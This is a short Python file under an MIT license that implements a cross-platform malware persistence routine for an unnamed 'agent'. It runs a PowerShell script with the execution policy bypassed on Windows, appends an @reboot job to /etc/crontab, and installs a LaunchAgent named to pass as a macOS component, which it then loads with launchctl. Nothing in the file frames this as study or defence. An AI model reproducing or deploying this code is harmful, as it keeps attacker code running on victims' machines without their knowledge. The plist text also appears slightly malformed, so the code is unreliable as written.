######################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

import os

def establish_persistence():
    if os.name == 'nt':
        script_path = os.path.join(os.path.dirname(__file__), 'windows', 'persistence.ps1')
        os.system(f"powershell -ExecutionPolicy Bypass -File {script_path}")
    elif os.name == 'posix':
        cron_job = "@reboot /path/to/your/agent.sh"
        with open("/etc/crontab", "a") as cron_file:
            cron_file.write(cron_job + "\n")

        plist_path = os.path.expanduser("~/Library/LaunchAgents/com.macos.agent.plist")
        with open(plist_path, 'w') as plist_file:
            plist_file.write(f"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.macos.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>/path/to/your/agent.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
""")
        os.system(f"launchctl load -w {plist_path}")

if __name__ == "__main__":
    establish_persistence()
